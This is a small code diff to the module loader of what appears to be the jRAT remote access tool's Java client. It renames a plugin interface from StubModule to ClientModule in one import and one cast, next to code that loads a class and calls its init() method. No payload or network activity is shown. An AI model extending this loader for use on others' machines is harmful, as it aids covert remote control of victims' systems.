@@ -1,7 +1,6 @@
 package jrat.client.modules;
 
-
-import apiv2.StubModule;
+import jrat.api.ClientModule;
 import jrat.client.Connection;
 import jrat.client.Injector;
 import jrat.client.InjectorClassloader;
@@ -40,7 +39,7 @@ public class ModuleLoader {
             }
 
             // load the main class
-            Class<StubModule> module = (Class<StubModule>) l.loadClass(mainClass);
+            Class<ClientModule> module = (Class<ClientModule>) l.loadClass(mainClass);
             Method method = module.getMethod("init");
 
             // invoke init()
